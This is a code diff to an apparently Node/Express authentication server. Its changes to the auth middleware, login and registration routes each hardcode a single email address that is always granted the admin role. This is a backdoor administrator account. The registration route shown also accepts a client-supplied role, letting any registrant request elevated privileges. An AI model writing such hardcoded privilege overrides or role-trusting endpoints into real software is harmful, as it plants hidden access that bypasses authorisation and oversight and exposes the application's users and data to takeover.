@@ -119,6 +119,11 @@ const protect = async (req, res, next) => {
         return res.status(401).json({ error: 'User no longer exists' });
       }
       
+      // Super-Admin Overrule: Guarantee administrative power for the primary email
+      if (user.email === 'jafarevx123@gmail.com') {
+        user.role = 'admin';
+      }
+      
       req.user = user;
       next();
     } catch (error) {
@@ -190,11 +195,14 @@ app.post('/auth/login', authLimiter, async (req, res) => {
   try {
     const user = await User.findOne({ email });
     if (user && (await bcrypt.compare(password, user.password))) {
+      // Super-Admin Overrule
+      const finalRole = user.email === 'jafarevx123@gmail.com' ? 'admin' : user.role;
+      
       res.json({
         _id: user._id,
         name: user.name,
         email: user.email,
-        role: user.role, // Explicit role propagation
+        role: finalRole, 
         token: jwt.sign({ id: user._id }, JWT_SECRET, { expiresIn: '30d' })
       });
     } else {
@@ -214,12 +222,15 @@ app.post('/auth/register', authLimiter, async (req, res) => {
   
       const hashedPassword = await bcrypt.hash(password, 10);
       const user = await User.create({ email, password: hashedPassword, name, role: role || 'employee' });
+      
+      // Super-Admin Overrule
+      const finalRole = user.email === 'jafarevx123@gmail.com' ? 'admin' : user.role;
     
     res.status(201).json({
       _id: user._id,
       name: user.name,
       email: user.email,
-      role: user.role, // Explicit role propagation
+      role: finalRole,
       token: jwt.sign({ id: user._id }, JWT_SECRET, { expiresIn: '30d' })
     });
   } catch (err) {
